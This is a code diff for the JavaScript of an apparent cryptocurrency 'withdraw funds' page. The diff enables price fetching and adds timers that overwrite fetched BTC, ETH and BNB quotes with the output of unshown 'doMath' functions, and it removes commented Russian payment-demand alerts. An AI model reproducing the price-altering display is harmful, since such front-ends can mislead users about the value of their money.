@@ -1,55 +1,53 @@
-// alert("ОЖИДАЮ ОПЛАТУ: 250 БЕЛ. РУБЛЕЙ")
-
 /** FETCH **/
-// const btc = document.getElementById('btc')
-// const eth = document.getElementById('eth')
-// const bnb = document.getElementById('bnb')
-// const xrp = document.getElementById('xrp')
-// const sol = document.getElementById('sol')
-// let payload = null
-// let gotPayloadTimes = 0
-// fetch('/server.php')
-//   .then(r => r.json())
-//   .then(r => {
-//     if (r.status === 'ERR') {
-//       console.error('Error getting latest crypto quotes')
-//       return
-//     }
+const btc = document.getElementById('btc')
+const eth = document.getElementById('eth')
+const bnb = document.getElementById('bnb')
+const xrp = document.getElementById('xrp')
+const sol = document.getElementById('sol')
+let payload = null
+let gotPayloadTimes = 0
+fetch('/server.php')
+  .then(r => r.json())
+  .then(r => {
+    if (r.status === 'ERR') {
+      console.error('Error getting latest crypto quotes')
+      return
+    }
 
-//     gotPayloadTimes++
-//     payload = r.payload
-//     document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
-//     btc.innerText = r.payload.btc
-//     eth.innerText = r.payload.eth
-//     bnb.innerText = r.payload.bnb
-//     xrp.innerText = r.payload.xrp
-//     sol.innerText = r.payload.sol
-//   })
+    gotPayloadTimes++
+    payload = r.payload
+    document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
+    btc.innerText = r.payload.btc
+    eth.innerText = r.payload.eth
+    bnb.innerText = r.payload.bnb
+    xrp.innerText = r.payload.xrp
+    sol.innerText = r.payload.sol
+  })
 
-// setInterval(() => {
-//   btc.innerText = formatWithCommas(doMathBtc(payload.btc))
-//   eth.innerText = formatWithCommas(doMathEth(payload.eth))
-//   bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
-// }, 3500)
-// setInterval(() => {
-//   if (gotPayloadTimes === 1) return  // TODO: change to 2
-//   fetch('/server.php')
-//     .then(r => r.json())
-//     .then(r => {
-//       if (r.status === 'ERR') {
-//         console.error('Error getting latest crypto quotes')
-//         return
-//       }
+setInterval(() => {
+  btc.innerText = formatWithCommas(doMathBtc(payload.btc))
+  eth.innerText = formatWithCommas(doMathEth(payload.eth))
+  bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
+}, 3500)
+setInterval(() => {
+  if (gotPayloadTimes === 2) return
+  fetch('/server.php')
+    .then(r => r.json())
+    .then(r => {
+      if (r.status === 'ERR') {
+        console.error('Error getting latest crypto quotes')
+        return
+      }
 
-//       gotPayloadTimes++
-//       payload = r.payload
-//       btc.innerText = r.payload.btc
-//       eth.innerText = r.payload.eth
-//       bnb.innerText = r.payload.bnb
-//       xrp.innerText = r.payload.xrp
-//       sol.innerText = r.payload.sol
-//     })
-// }, 32000)
+      gotPayloadTimes++
+      payload = r.payload
+      btc.innerText = r.payload.btc
+      eth.innerText = r.payload.eth
+      bnb.innerText = r.payload.bnb
+      xrp.innerText = r.payload.xrp
+      sol.innerText = r.payload.sol
+    })
+}, 32000)
 
 let lastHistoryState = history.state;
 window.addEventListener('popstate', (e) => {
@@ -233,9 +231,6 @@ closeBtn.onclick = () => {
   btnSubmitInnerText.innerHTML = 'Вывести средства'
   btnSubmit.disabled = false
   enableScrollEvents()
-  // setTimeout(() => {
-  //   alert("ОЖИДАЮ ОПЛАТУ: 250 БЕЛ. РУБЛЕЙ")
-  // }, 600)
 }
 overlay.onclick = () => {
   overlay.classList.remove('overlay--db')
@@ -246,9 +241,6 @@ overlay.onclick = () => {
   btnSubmitInnerText.innerHTML = 'Вывести средства'
   btnSubmit.disabled = false
   enableScrollEvents()
-  // setTimeout(() => {
-  //   alert("ОЖИДАЮ ОПЛАТУ: 250 БЕЛ. РУБЛЕЙ")
-  // }, 600)
 }
 
 /** SELECT **/
@@ -258,22 +250,6 @@ select.addEventListener('change', function() {
   if (selectedValue !== "") this.className = 'select-color-chosen'
   else this.className = ''
 })
-
-
-// function add300AndFormat(numberStr) {
-//   // Step 1: Remove commas and convert to a number
-//   const number = parseInt(numberStr.replace(/,/g, ''));
-
-//   // Step 2: Add 300
-//   const resultNumber = number + 300;
-
-//   // return resultNumber
-
-//   // Step 3: Format back with commas (optional, for better readability)
-//   const formattedResult = resultNumber.toLocaleString('en-US');
-
-//   return formattedResult;
-// }
 
 
 function doMathBtc(strNum) {
